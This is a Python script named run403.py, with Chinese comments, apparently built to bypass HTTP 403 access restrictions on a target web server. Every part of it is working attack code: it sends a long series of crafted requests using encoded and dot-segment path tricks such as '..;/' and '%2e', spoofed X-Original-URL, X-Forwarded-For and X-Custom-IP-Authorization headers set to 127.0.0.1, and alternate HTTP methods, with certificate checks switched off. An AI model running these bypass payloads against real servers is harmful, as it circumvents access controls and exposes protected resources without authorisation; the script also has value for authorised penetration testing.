import requests
import json
import art
import sys
import urllib3
import logging
import signal  
import getpass  

# 配置logging模块  
logging.basicConfig(filename='error.txt', level=logging.DEBUG)  

# 禁用urllib3的警告信息  
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  

def handle_interrupt(sig, frame):  
    choice = input("\n按下 Ctrl+C 时，输入 'c' 继续，输入 'q' 退出: ")  
    if choice == 'q':  
        print("程序已退出")  
        sys.exit()  
    elif choice == 'c':  
        print("继续执行...")  
        signal.signal(signal.SIGINT, signal.SIG_IGN)  # 忽略SIGINT信号，这样就可以按多次Ctrl+C而不会重复提示用户  
  
# 设置信号处理函数  
signal.signal(signal.SIGINT, handle_interrupt)  # 将SIGINT信号的处理函数设置为handle_interrupt  

def bypass_403(url, path):    
    # 打印标题    
    print(art.text2art("run403.py"))    
    print("By AI")    
    print("python ./run403.py http://test.com home")    
    print("1开头的是在url上修改")   
    print("2开头的是在请求头上修改") 
    print("3开头的是post请求") 
    print("4开头的是其它请求")    
    print("同时按下 Ctrl+C 暂停") 


# 发起GET请求，原请求，并打印HTTP状态码和下载大小  
    res11 = requests.get(f"{url}/{path}", verify=False, stream=True)    
    print(f"11  --> {url}/{path}")      
    if 'content-length' in res11.headers:  
        print(f"HTTP状态码: {res11.status_code}, 下载大小: {res11.headers['content-length']}")         
    else:  
        print(f"HTTP状态码: {res11.status_code}, 下载大小: 未知")      

# 发起GET请求，路径添加%2e字符，并打印HTTP状态码和下载大小 
    res12 = requests.get(f"{url}/%2e/{path}/.", verify=False, stream=True)  
    print(f"12  --> {url}/%2e/{path}/")  
    if 'content-length' in res12.headers:
        print(f"HTTP状态码: {res12.status_code}, 下载大小: {res12.headers['content-length']}")     
    else:  
        print(f"HTTP状态码: {res12.status_code}, 下载大小: 未知")

# 发起GET请求，路径添加.字符，并打印HTTP状态码和下载大小 
    res13 = requests.get(f"{url}/{path}/.", verify=False, stream=True)  
    print(f"13  --> {url}/{path}/.")  
    if 'content-length' in res13.headers:
        print(f"HTTP状态码: {res13.status_code}, 下载大小: {res13.headers['content-length']}")     
    else:  
        print(f"HTTP状态码: {res13.status_code}, 下载大小: 未知")

# 发起GET请求，路径添加//，并打印HTTP状态码和下载大小
    res14 = requests.get(f"{url}//{path}//", verify=False, stream=True)  
    print(f"14  --> {url}//{path}//")  
    if 'content-length' in res14.headers:
        print(f"HTTP状态码: {res14.status_code}, 下载大小: {res14.headers['content-length']}") 
    else:  
        print(f"HTTP状态码: {res14.status_code}, 下载大小: 未知")

# 发起GET请求，路径添加./，并打印HTTP状态码和下载大小
    res15 = requests.get(f"{url}/./{path}/./", verify=False, stream=True)  
    print(f"15  --> {url}/./{path}/./")  
    if 'content-length' in res15.headers:
        print(f"HTTP状态码: {res15.status_code}, 下载大小: {res15.headers['content-length']}") 
    else:  
        print(f"HTTP状态码: {res15.status_code}, 下载大小: 未知")

# 发起GET请求，路径添加%20，并打印HTTP状态码和下载大小
    res16 = requests.get(f"{url}/{path}%20", verify=False, stream=True)  
    print(f"16  --> {url}/{path}%20")  
    if 'content-length' in res16.headers:
        print(f"HTTP状态码: {res16.status_code}, 下载大小: {res16.headers['content-length']}") 
    else:  
        print(f"HTTP状态码: {res16.status_code}, 下载大小: 未知") 

# 发起GET请求，路径添加%09，并打印HTTP状态码和下载大小
    res17 = requests.get(f"{url}/{path}%09", verify=False, stream=True)  
    print(f"17  --> {url}/{path}%09")  
    if 'content-length' in res17.headers:
        print(f"HTTP状态码: {res17.status_code}, 下载大小: {res17.headers['content-length']}") 
    else:  
        print(f"HTTP状态码: {res17.status_code}, 下载大小: 未知") 

# 发起GET请求，路径添加?，并打印HTTP状态码和下载大小
    res18 = requests.get(f"{url}/{path}?", verify=False, stream=True)  
    print(f"18  --> {url}/{path}?")  
    if 'content-length' in res18.headers:
        print(f"HTTP状态码: {res18.status_code}, 下载大小: {res18.headers['content-length']}") 
    else:  
        print(f"HTTP状态码: {res18.status_code}, 下载大小: 未知") 

# 发起GET请求，路径添加.html，并打印HTTP状态码和下载大小
    res19 = requests.get(f"{url}/{path}.html", verify=False, stream=True)  
    print(f"19  --> {url}/{path}.html")  
    if 'content-length' in res19.headers:
        print(f"HTTP状态码: {res19.status_code}, 下载大小: {res19.headers['content-length']}") 
    else:  
        print(f"HTTP状态码: {res19.status_code}, 下载大小: 未知")

# 发起GET请求，路径添加/?anything，并打印HTTP状态码和下载大小
    res110 = requests.get(f"{url}/{path}/?anything", verify=False, stream=True)  
    print(f"110  --> {url}/{path}/?anything")  
    if 'content-length' in res110.headers:
        print(f"HTTP状态码: {res110.status_code}, 下载大小: {res110.headers['content-length']}") 
    else:  
        print(f"HTTP状态码: {res110.status_code}, 下载大小: 未知")

# 发起GET请求，路径添加#，并打印HTTP状态码和下载大小
    res111 = requests.get(f"{url}/{path}#", verify=False, stream=True)  
    print(f"111  --> {url}/{path}#")  
    if 'content-length' in res111.headers:
        print(f"HTTP状态码: {res111.status_code}, 下载大小: {res111.headers['content-length']}") 
    else:  
        print(f"HTTP状态码: {res111.status_code}, 下载大小: 未知")

# 发起GET请求，路径添加/*，并打印HTTP状态码和下载大小
    res112 = requests.get(f"{url}/{path}/*", verify=False, stream=True)  
    print(f"112  --> {url}/{path}/*")  
    if 'content-length' in res112.headers:
        print(f"HTTP状态码: {res112.status_code}, 下载大小: {res112.headers['content-length']}")
    else:  
        print(f"HTTP状态码: {res112.status_code}, 下载大小: 未知") 

# 发起GET请求，路径添加.php，并打印HTTP状态码和下载大小
    res113 = requests.get(f"{url}/{path}.php", verify=False, stream=True)  
    print(f"113  --> {url}/{path}.php")  
    if 'content-length' in res113.headers:
        print(f"HTTP状态码: {res113.status_code}, 下载大小: {res113.headers['content-length']}") 
    else:  
        print(f"HTTP状态码: {res113.status_code}, 下载大小: 未知") 

# 发起GET请求，路径添加.json，并打印HTTP状态码和下载大小
    res114 = requests.get(f"{url}/{path}.json", verify=False, stream=True)  
    print(f"114  --> {url}/{path}.json")  
    if 'content-length' in res114.headers:
        print(f"HTTP状态码: {res114.status_code}, 下载大小: {res114.headers['content-length']}")
    else:  
        print(f"HTTP状态码: {res114.status_code}, 下载大小: 未知")  

# 发起GET请求，路径添加..;/，并打印HTTP状态码和下载大小
    res115 = requests.get(f"{url}/{path}..;/", verify=False, stream=True)  
    print(f"115  --> {url}/{path}..;/")  
    if 'content-length' in res115.headers:
        print(f"HTTP状态码: {res115.status_code}, 下载大小: {res115.headers['content-length']}") 
    else:  
        print(f"HTTP状态码: {res115.status_code}, 下载大小: 未知") 

# 发起GET请求，路径中间添加/..;/，并打印HTTP状态码和下载大小
    res116 = requests.get(f"{url}/..;{path}/", verify=False, stream=True)  
    print(f"116  --> {url}/..;/{path}/") 
    if 'content-length' in res116.headers: 
        print(f"HTTP状态码: {res116.status_code}, 下载大小: {res116.headers['content-length']}")
    else:  
        print(f"HTTP状态码: {res116.status_code}, 下载大小: 未知")

 # 发起GET请求，路径中间添加/..;/，并打印HTTP状态码和下载大小
    res117 = requests.get(f"{url}/..;/{path}/..;/", verify=False, stream=True)  
    print(f"117  --> {url}/..;/{path}/..;/")  
    if 'content-length' in res117.headers: 
        print(f"HTTP状态码: {res117.status_code}, 下载大小: {res117.headers['content-length']}")
    else:  
        print(f"HTTP状态码: {res117.status_code}, 下载大小: 未知") 

 # 发起GET请求，路径添加;/，并打印HTTP状态码和下载大小
    res118 = requests.get(f"{url}/{path};/", verify=False, stream=True)  
    print(f"118  --> {url}/{path};/")  
    if 'content-length' in res118.headers: 
        print(f"HTTP状态码: {res118.status_code}, 下载大小: {res118.headers['content-length']}")
    else:  
        print(f"HTTP状态码: {res118.status_code}, 下载大小: 未知")
 
 # 发起GET请求，路径添加....//，并打印HTTP状态码和下载大小
    res119 = requests.get(f"{url}/....//test/....//{path}", verify=False, stream=True)  
    print(f"119  --> {url}/....//test/....//{path}")
    if 'content-length' in res119.headers:   
        print(f"HTTP状态码: {res119.status_code}, 下载大小: {res119.headers['content-length']}")
    else:  
        print(f"HTTP状态码: {res119.status_code}, 下载大小: 未知") 

# 发起GET请求，添加X-rewrite-url头，并打印HTTP状态码和下载大小  
    res21 = requests.get(f"{url}", headers={"X-rewrite-url": f"{path}"}, verify=False, stream=True)  
    print(f"21  --> {url} -H X-rewrite-url: {path}")  
    if 'content-length' in res21.headers: 
        print(f"HTTP状态码: {res21.status_code}, 下载大小: {res21.headers['content-length']}") 
    else:  
        print(f"HTTP状态码: {res21.status_code}, 下载大小: 未知")  
  
# 发起GET请求，添加X-Original-URL头，通常用于存储原始的请求URL,并打印HTTP状态码和下载大小  
    res22 = requests.get(f"{url}", headers={"X-Original-URL": f"{path}"}, verify=False, stream=True)  
    print(f"22  --> {url} -H X-Original-URL: {path}")  
    if 'content-length' in res22.headers: 
        print(f"HTTP状态码: {res22.status_code}, 下载大小: {res22.headers['content-length']}") 
    else:  
        print(f"HTTP状态码: {res22.status_code}, 下载大小: 未知")  

# 发起GET请求，添加X-Custom-IP-Authorization头，通常用于授权或验证请求的来源IP地址，并打印HTTP状态码和下载大小  
    res23 = requests.get(f"{url}", headers={"X-Custom-IP-Authorization": "127.0.0.1"}, verify=False, stream=True)  
    print(f"23  --> {url} -H X-Custom-IP-Authorization: 127.0.0.1")  
    if 'content-length' in res23.headers:
        print(f"HTTP状态码: {res23.status_code}, 下载大小: {res23.headers['content-length']}") 
    else:  
        print(f"HTTP状态码: {res23.status_code}, 下载大小: 未知")  

# 发起GET请求，添加X-Forwarded-For头1，并打印HTTP状态码和下载大小  
    res24 = requests.get(f"{url}", headers={"X-Forwarded-For": "127.0.0.1"}, verify=False, stream=True)  
    print(f"24  --> {url} -H X-Forwarded-For1: 127.0.0.1")  
    if 'content-length' in res24.headers:
        print(f"HTTP状态码: {res24.status_code}, 下载大小: {res24.headers['content-length']}") 
    else:  
        print(f"HTTP状态码: {res24.status_code}, 下载大小: 未知")  

# 发起GET请求，添加X-Forwarded-For头2，并打印HTTP状态码和下载大小  
    res25 = requests.get(f"{url}", headers={"X-Forwarded-For": "127.0.0.1:80"}, verify=False, stream=True)  
    print(f"25  --> {url} -H X-Forwarded-For2: 127.0.0.1:80")  
    if 'content-length' in res25.headers:
        print(f"HTTP状态码: {res25.status_code}, 下载大小: {res25.headers['content-length']}")
    else:  
        print(f"HTTP状态码: {res25.status_code}, 下载大小: 未知")    

# 发起GET请求，添加X-Host头，并打印HTTP状态码和下载大小  
    res26 = requests.get(f"{url}", headers={"X-Host": "127.0.0.1"}, verify=False, stream=True)  
    print(f"26  --> {url} -H X-Host: 127.0.0.1")  
    if 'content-length' in res26.headers:
        print(f"HTTP状态码: {res26.status_code}, 下载大小: {res26.headers['content-length']}")
    else:  
        print(f"HTTP状态码: {res26.status_code}, 下载大小: 未知")  

# 发起GET请求，添加X-Host头，并打印HTTP状态码和下载大小  
    res27 = requests.get(f"{url}", headers={"X-Forwarded-Host": "127.0.0.1"}, verify=False, stream=True)  
    print(f"27  --> {url} -H X-Forwarded-Host: 127.0.0.1")  
    if 'content-length' in res27.headers:
        print(f"HTTP状态码: {res27.status_code}, 下载大小: {res27.headers['content-length']}")
    else:  
        print(f"HTTP状态码: {res27.status_code}, 下载大小: 未知") 

#post请求
    data = {  
        f"{path}": "123456",  
        "id": "1"  
    }  
# 发起POST请求，将路径放在请求头中，添加Content-Length头，并打印HTTP状态码和下载大小  
    res31 = requests.post(f"{url}", headers={"Content-Length": f"str(len(data))"}, verify=False, stream=True)  
    print(f"31  --> {url} -Post data:{data}")  
    if 'content-length' in res31.headers:
        print(f"HTTP状态码: {res31.status_code}, 下载大小: {res31.headers['content-length']}") 
    else:  
        print(f"HTTP状态码: {res31.status_code}, 下载大小: 未知") 

# 发起POST请求，添加Content-Length头，其值为0,相当于请求体为空，并打印HTTP状态码和下载大小  
    res32 = requests.post(f"{url}", headers={"Content-Length": "0"}, verify=False, stream=True)  
    print(f"32  --> {url} -Post data:{data}")  
    if 'content-length' in res32.headers:
        print(f"HTTP状态码: {res32.status_code}, 下载大小: {res32.headers['content-length']}")
    else:  
        print(f"HTTP状态码: {res32.status_code}, 下载大小: 未知") 

  
# 发起put请求，并打印HTTP状态码和下载大小 
    res41 = requests.put(f"{url}/{path}", verify=False, stream=True)  
    print(f"41  --> {url}/{path} -put")  
    if 'content-length' in res41.headers:
        print(f"HTTP状态码: {res41.status_code}, 下载大小: {res41.headers['content-length']}") 
    else:  
        print(f"HTTP状态码: {res41.status_code}, 下载大小: 未知")  
 
 # 发起HEAD请求，HEAD请求与GET请求相似，但服务器在响应中只返回HTTP头部，而不返回实际的数据体 
    res42 = requests.head(f"{url}/{path}", verify=False, stream=True)  
    print(f"42  --> {url}/{path} -head")  
    print(f"HTTP状态码: {res42.status_code}") 

# 发起PATCH请求，原请求，并打印HTTP状态码和下载大小  
    res43 = requests.patch(f"{url}/{path}", verify=False, stream=True)    
    print(f"43  --> {url}/{path} -patch")      
    if 'content-length' in res43.headers:  
        print(f"HTTP状态码: {res43.status_code}, 下载大小: {res43.headers['content-length']}")         
    else:  
        print(f"HTTP状态码: {res43.status_code}, 下载大小: 未知")  

# 发起options请求
    res44 = requests.options(f"{url}/{path}", verify=False, stream=True)  
    print(f"44  --> {url}/{path} -options")  
    if 'allow' in res44.headers:  
        print(f"HTTP状态码: {res44.status_code}, 允许的方法: {res44.headers['allow']}")  
    else:  
        print(f"HTTP状态码: {res44.status_code}, 允许的方法: 不允许")


 #----------------------------------------------------------------------------------------------------------------------       
if __name__ == "__main__":    
    if len(sys.argv) != 3:    
        print("参考用法: python  ./run403.py       url        路径") 
        print("示例1:    python  ./run403.py http://test.com  home") 
        print("示例2:    python  ./run403.py http://test.com/main  home")   
        sys.exit(1)    
    url = sys.argv[1]    
    path = sys.argv[2]    
    bypass_403(url, path)
